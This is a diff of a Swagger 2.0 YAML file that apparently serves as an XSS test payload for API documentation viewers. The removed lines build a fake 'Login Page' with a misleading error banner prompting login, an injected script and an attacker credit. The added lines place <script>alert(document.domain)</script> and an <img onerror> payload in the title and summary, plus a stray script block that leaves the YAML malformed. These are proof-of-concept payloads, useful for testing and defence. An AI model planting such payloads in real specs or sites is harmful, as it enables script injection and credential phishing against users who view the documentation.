@@ -1,25 +1,14 @@
 swagger: '2.0'
 info:
-  version: 1.0.0
-  title: Login Page
-  description: '<div class="login-form">
-<!-- Error Message -->
-<div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-  <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-    <strong>An error occurred while loading, please log in.</strong>
-  </div>
-</div>
-<script>
+  title: "<script>alert(document.domain)</script>"
+  version: "1.0.0"
+paths:
+  /test:
+    get:
+      summary: "Test endpoint with <img src=x onerror=alert(1)>"
+      responses:
+        200:
+          description: "OK"
+          <script>
 eval(10+20)
 </script>
-<!-- Footer with your name -->
-<div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
-  Coffinxp~/.lostsec
-</div>
-  '
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
